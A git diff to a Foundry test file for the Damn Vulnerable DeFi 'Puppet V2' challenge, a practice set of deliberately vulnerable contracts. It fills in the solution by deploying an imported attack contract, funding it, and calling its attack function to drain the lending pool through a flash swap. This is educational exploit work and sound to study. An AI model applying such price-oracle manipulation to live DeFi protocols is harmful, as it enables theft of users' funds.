@@ -9,6 +9,7 @@ import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUn
 import {WETH} from "solmate/tokens/WETH.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";
+import {HackPuppetV2Pool} from "../../src/puppet-v2/HackPuppetV2Pool.sol";
 
 contract PuppetV2Challenge is Test {
     address deployer = makeAddr("deployer");
@@ -98,7 +99,15 @@ contract PuppetV2Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
-        
+
+        // create new contract that implements uniswapV2Call so it can receive a flash swap
+        HackPuppetV2Pool hackContract = new HackPuppetV2Pool(address(recovery), uniswapV2Exchange, weth, token, lendingPool, uniswapV2Router);
+
+        // send ETH to the contract, we will convert it to WETH inside the contract
+        address(hackContract).call{value: 20 ether}("");
+        token.transfer(address(hackContract), PLAYER_INITIAL_TOKEN_BALANCE);
+        hackContract.attack();
+
     }
 
     /**
